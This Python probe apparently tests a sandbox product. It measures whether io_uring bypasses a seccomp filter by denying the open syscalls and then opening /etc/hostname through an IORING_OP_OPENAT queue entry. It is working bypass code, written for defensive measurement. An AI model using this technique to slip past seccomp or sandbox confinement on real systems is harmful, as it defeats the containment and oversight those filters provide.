#!/usr/bin/env python3
"""Does io_uring walk around a seccomp filter on THIS kernel? Measure it.

The Stage F deny list contains three io_uring rows, and they are the rows the
rest of the table depends on: a submission queue performs opens, reads, writes
and connects as queue entries, and a queue entry is not a syscall, so a seccomp
filter never sees it. That is the claim. This probe does not repeat it, it tries
it:

  1. install a filter that denies open, openat and openat2 and NOTHING else,
  2. show that opening a file now fails EPERM,
  3. submit IORING_OP_OPENAT for the same file through a ring and read the
     completion.

If step 3 returns a descriptor, the filter was bypassed, and every deny list on
this kernel that leaves io_uring reachable is advisory. Run it a second time
inside a Firebreak sandbox to see the same attempt stopped at the ring.
"""
import ctypes
import errno
import json
import mmap
import os
import struct
import sys

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.prctl.restype = ctypes.c_int
libc.mmap.restype = ctypes.c_void_p
libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
                      ctypes.c_int, ctypes.c_int, ctypes.c_long]

NR_OPEN, NR_OPENAT, NR_OPENAT2 = 2, 257, 437
NR_SECCOMP = 317
NR_IO_URING_SETUP, NR_IO_URING_ENTER = 425, 426
AUDIT_ARCH_X86_64 = 0xC000003E
SECCOMP_RET_ERRNO_EPERM = 0x00050000 | 1
SECCOMP_RET_ALLOW = 0x7FFF0000
IORING_OFF_SQ_RING, IORING_OFF_CQ_RING, IORING_OFF_SQES = 0, 0x8000000, 0x10000000
IORING_OP_OPENAT = 18
AT_FDCWD = -100
TARGET = b"/etc/hostname"


def install_open_denying_filter():
    """A filter that denies exactly the three ways to open a file by name."""
    program = [
        (0x20, 0, 0, 4),                              # load arch
        (0x15, 1, 0, AUDIT_ARCH_X86_64),
        (0x06, 0, 0, SECCOMP_RET_ERRNO_EPERM),
        (0x20, 0, 0, 0),                              # load nr
        (0x15, 3, 0, NR_OPEN),
        (0x15, 2, 0, NR_OPENAT),
        (0x15, 1, 0, NR_OPENAT2),
        (0x06, 0, 0, SECCOMP_RET_ALLOW),
        (0x06, 0, 0, SECCOMP_RET_ERRNO_EPERM),
    ]
    blob = b"".join(struct.pack("=HBBI", *one) for one in program)
    buf = ctypes.create_string_buffer(blob, len(blob))

    class SockFprog(ctypes.Structure):
        _fields_ = [("len", ctypes.c_ushort), ("filter", ctypes.c_void_p)]

    fprog = SockFprog(len(program), ctypes.cast(buf, ctypes.c_void_p))
    if libc.prctl(38, 1, 0, 0, 0) != 0:
        raise SystemExit("PR_SET_NO_NEW_PRIVS refused")
    ctypes.set_errno(0)
    if libc.syscall(ctypes.c_long(NR_SECCOMP), ctypes.c_long(1), ctypes.c_long(0),
                    ctypes.byref(fprog)) != 0:
        raise SystemExit("seccomp refused the filter: %s"
                         % errno.errorcode.get(ctypes.get_errno()))
    return len(program)


def open_by_syscall(path):
    ctypes.set_errno(0)
    fd = libc.syscall(ctypes.c_long(NR_OPENAT), ctypes.c_long(AT_FDCWD),
                      ctypes.c_char_p(path), ctypes.c_long(os.O_RDONLY), ctypes.c_long(0))
    if fd == -1:
        return "blocked:" + errno.errorcode.get(ctypes.get_errno(), "?")
    os.close(fd)
    return "REACHED"


def open_by_io_uring(path):
    """IORING_OP_OPENAT. No open, openat or openat2 is issued by this function."""
    params = ctypes.create_string_buffer(120)
    ctypes.set_errno(0)
    ring = libc.syscall(ctypes.c_long(NR_IO_URING_SETUP), ctypes.c_long(8),
                        ctypes.byref(params))
    if ring == -1:
        return "blocked-at-setup:" + errno.errorcode.get(ctypes.get_errno(), "?")
    raw = bytes(params)
    sq_entries, cq_entries = struct.unpack_from("=II", raw, 0)
    (sq_head, sq_tail, sq_mask, sq_ring_entries, sq_flags, sq_dropped,
     sq_array) = struct.unpack_from("=7I", raw, 40)
    (cq_head, cq_tail, cq_mask, cq_ring_entries, cq_overflow,
     cq_cqes) = struct.unpack_from("=6I", raw, 80)

    sq_len = sq_array + sq_entries * 4
    cq_len = cq_cqes + cq_entries * 16
    MAP_SHARED, MAP_POPULATE = 0x01, 0x8000
    prot = mmap.PROT_READ | mmap.PROT_WRITE
    sq_ring = libc.mmap(None, sq_len, prot, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_SQ_RING)
    cq_ring = libc.mmap(None, cq_len, prot, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_CQ_RING)
    sqes = libc.mmap(None, sq_entries * 64, prot, MAP_SHARED | MAP_POPULATE, ring, IORING_OFF_SQES)
    for name, value in (("sq_ring", sq_ring), ("cq_ring", cq_ring), ("sqes", sqes)):
        if value in (None, 0xFFFFFFFFFFFFFFFF):
            return "mmap-failed:" + name

    pathbuf = ctypes.create_string_buffer(path, len(path) + 1)
    mask = ctypes.c_uint.from_address(sq_ring + sq_mask).value
    tail = ctypes.c_uint.from_address(sq_ring + sq_tail).value
    index = tail & mask
    sqe = (ctypes.c_char * 64).from_address(sqes + index * 64)
    ctypes.memset(sqe, 0, 64)
    struct.pack_into("=BBHi", sqe, 0, IORING_OP_OPENAT, 0, 0, AT_FDCWD)
    struct.pack_into("=Q", sqe, 16, ctypes.addressof(pathbuf))     # addr = pathname
    struct.pack_into("=I", sqe, 24, 0)                             # len = mode
    struct.pack_into("=I", sqe, 28, os.O_RDONLY)                   # open_flags
    struct.pack_into("=Q", sqe, 32, 0x5AFE)                        # user_data
    ctypes.c_uint.from_address(sq_ring + sq_array + index * 4).value = index
    ctypes.c_uint.from_address(sq_ring + sq_tail).value = tail + 1

    ctypes.set_errno(0)
    submitted = libc.syscall(ctypes.c_long(NR_IO_URING_ENTER), ctypes.c_long(ring),
                             ctypes.c_long(1), ctypes.c_long(1), ctypes.c_long(1),
                             ctypes.c_long(0), ctypes.c_long(0))
    if submitted == -1:
        return "blocked-at-enter:" + errno.errorcode.get(ctypes.get_errno(), "?")
    head = ctypes.c_uint.from_address(cq_ring + cq_head).value
    cmask = ctypes.c_uint.from_address(cq_ring + cq_mask).value
    cqe = (ctypes.c_char * 16).from_address(cq_cqes + cq_ring + (head & cmask) * 16)
    user_data, res, _ = struct.unpack("=QiI", bytes(cqe))
    if user_data != 0x5AFE:
        return "no-completion"
    if res < 0:
        return "blocked-in-ring:" + errno.errorcode.get(-res, str(-res))
    return "REACHED:fd%d" % res


def read_through_the_smuggled_fd(result):
    """Proof it is a real descriptor to the real file, not a number."""
    if not result.startswith("REACHED:fd"):
        return None
    fd = int(result[len("REACHED:fd"):])
    try:
        return os.read(fd, 64).decode().strip()
    finally:
        os.close(fd)


if __name__ == "__main__":
    out = {"target": TARGET.decode()}
    out["open_before_filter"] = open_by_syscall(TARGET)
    out["io_uring_setup_before_filter"] = (
        "REACHED" if libc.syscall(ctypes.c_long(NR_IO_URING_SETUP), ctypes.c_long(8),
                                  ctypes.byref(ctypes.create_string_buffer(120))) != -1
        else "blocked:" + errno.errorcode.get(ctypes.get_errno(), "?"))
    out["filter_instructions"] = install_open_denying_filter()
    out["open_after_filter"] = open_by_syscall(TARGET)
    out["io_uring_openat_after_filter"] = open_by_io_uring(TARGET)
    out["contents_read_through_it"] = read_through_the_smuggled_fd(
        out["io_uring_openat_after_filter"])
    print("RESULT " + json.dumps(out))
